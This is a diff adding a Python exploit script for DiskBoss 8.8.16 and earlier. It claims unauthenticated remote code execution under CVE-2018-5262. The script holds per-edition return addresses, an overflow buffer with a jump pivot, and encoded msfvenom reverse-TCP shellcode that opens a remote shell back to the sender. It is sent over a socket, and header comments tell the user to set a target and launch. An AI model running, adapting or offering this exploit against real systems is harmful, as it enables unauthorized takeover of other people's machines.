@@ -1,0 +1,105 @@
+# Exploit Title: DiskBoss <= 8.8.16 - Unauthenticated Remote Code Execution
+# Date: 2017-08-27
+# Exploit Author: Arris Huijgen
+# Vendor Homepage: http://www.diskboss.com/
+# Software Link: http://www.diskboss.com/setups/diskbossent_setup_v8.8.16.exe
+# Version: Through 8.8.16
+# Tested on: Windows 7 SP1 x64, Windows XP SP3 x86
+# CVE: CVE-2018-5262
+
+# Usage
+# 1. Update the Target section
+# 2. Update the shellcode
+# 3. Launch!
+
+
+import socket
+from struct import pack
+
+# Software editions (port, offset)
+free8416 = (8096, 0x10036e9a) # ADD ESP,8 | RET 0x04 @ libdbs.dll
+pro8416  = (8097, 0x10036e9a) # ADD ESP,8 | RET 0x04 @ libdbs.dll
+ult8416  = (8098, 0x10036e9a) # ADD ESP,8 | RET 0x04 @ libdbs.dll
+srv8416  = (8094, 0x1001806e) # ADD ESP,8 | RET 0x04 @ libpal.dll
+ent8416  = (8094, 0x1001806e) # ADD ESP,8 | RET 0x04 @ libpal.dll
+ent8512  = (8094, 0x100180ee) # ADD ESP,8 | RET 0x04 @ libpal.dll
+free8816 = (8096, 0x10037f6a) # ADD ESP,8 | RET 0x04 @ libdbs.dll
+pro8816  = (8097, 0x10037f6a) # ADD ESP,8 | RET 0x04 @ libdbs.dll
+ult8816  = (8098, 0x10037f6a) # ADD ESP,8 | RET 0x04 @ libdbs.dll
+srv8816  = (8094, 0x100180f9) # ADD ESP,8 | RET 0x04 @ libpal.dll
+ent8816  = (8094, 0x100180f9) # ADD ESP,8 | RET 0x04 @ libpal.dll
+
+
+# Target
+host         = '127.0.0.1'
+(port, addr) = ent8816
+
+
+def main():
+    # Connect
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    print '[+] Connected to %s:%d' % (host, port)
+
+    # Memory
+    size = 1000
+    offset = 128
+
+    # Payload
+    preret = '\xEB\x06\x90\x90'     # JMP 0x06
+    ret = pack('<I', addr)          # Depending on the software edition
+    pivot = '\xe9\x3f\xfb\xff\xff'  # JMP -0x4BC
+
+    # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1234 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b '\x00'
+    # Payload size: 351 bytes
+    sc = (
+        "\xb8\x80\xac\x48\x8f\xd9\xc4\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
+        "\x52\x31\x45\x12\x03\x45\x12\x83\x45\xa8\xaa\x7a\xb9\x59\xa8"
+        "\x85\x41\x9a\xcd\x0c\xa4\xab\xcd\x6b\xad\x9c\xfd\xf8\xe3\x10"
+        "\x75\xac\x17\xa2\xfb\x79\x18\x03\xb1\x5f\x17\x94\xea\x9c\x36"
+        "\x16\xf1\xf0\x98\x27\x3a\x05\xd9\x60\x27\xe4\x8b\x39\x23\x5b"
+        "\x3b\x4d\x79\x60\xb0\x1d\x6f\xe0\x25\xd5\x8e\xc1\xf8\x6d\xc9"
+        "\xc1\xfb\xa2\x61\x48\xe3\xa7\x4c\x02\x98\x1c\x3a\x95\x48\x6d"
+        "\xc3\x3a\xb5\x41\x36\x42\xf2\x66\xa9\x31\x0a\x95\x54\x42\xc9"
+        "\xe7\x82\xc7\xc9\x40\x40\x7f\x35\x70\x85\xe6\xbe\x7e\x62\x6c"
+        "\x98\x62\x75\xa1\x93\x9f\xfe\x44\x73\x16\x44\x63\x57\x72\x1e"
+        "\x0a\xce\xde\xf1\x33\x10\x81\xae\x91\x5b\x2c\xba\xab\x06\x39"
+        "\x0f\x86\xb8\xb9\x07\x91\xcb\x8b\x88\x09\x43\xa0\x41\x94\x94"
+        "\xc7\x7b\x60\x0a\x36\x84\x91\x03\xfd\xd0\xc1\x3b\xd4\x58\x8a"
+        "\xbb\xd9\x8c\x1d\xeb\x75\x7f\xde\x5b\x36\x2f\xb6\xb1\xb9\x10"
+        "\xa6\xba\x13\x39\x4d\x41\xf4\x39\x92\x49\x05\xae\x90\x49\x01"
+        "\xfc\x1c\xaf\x63\x10\x49\x78\x1c\x89\xd0\xf2\xbd\x56\xcf\x7f"
+        "\xfd\xdd\xfc\x80\xb0\x15\x88\x92\x25\xd6\xc7\xc8\xe0\xe9\xfd"
+        "\x64\x6e\x7b\x9a\x74\xf9\x60\x35\x23\xae\x57\x4c\xa1\x42\xc1"
+        "\xe6\xd7\x9e\x97\xc1\x53\x45\x64\xcf\x5a\x08\xd0\xeb\x4c\xd4"
+        "\xd9\xb7\x38\x88\x8f\x61\x96\x6e\x66\xc0\x40\x39\xd5\x8a\x04"
+        "\xbc\x15\x0d\x52\xc1\x73\xfb\xba\x70\x2a\xba\xc5\xbd\xba\x4a"
+        "\xbe\xa3\x5a\xb4\x15\x60\x7a\x57\xbf\x9d\x13\xce\x2a\x1c\x7e"
+        "\xf1\x81\x63\x87\x72\x23\x1c\x7c\x6a\x46\x19\x38\x2c\xbb\x53"
+        "\x51\xd9\xbb\xc0\x52\xc8"
+    )
+
+    # Compile payload
+    fill = 'A' * (offset - len(preret))
+    code = fill + preret + ret + pivot
+    nops = '\x90' * (size - len(code) - len(sc) - 100)
+    payload = code + nops + sc + 'C' * 100
+
+    # Compile message
+    msg = (
+        '\x75\x19\xba\xab' +
+        '\x03\x00\x00\x00' +
+        '\x00\x40\x00\x00' +
+        pack('<I', len(payload)) +
+        pack('<I', len(payload)) +
+        pack('<I', ord(payload[-1])) + 
+        payload
+    )
+
+    # Send message
+    s.send(msg)
+    print '[+] Exploit sent!'
+
+
+if __name__ == '__main__':
+    main()
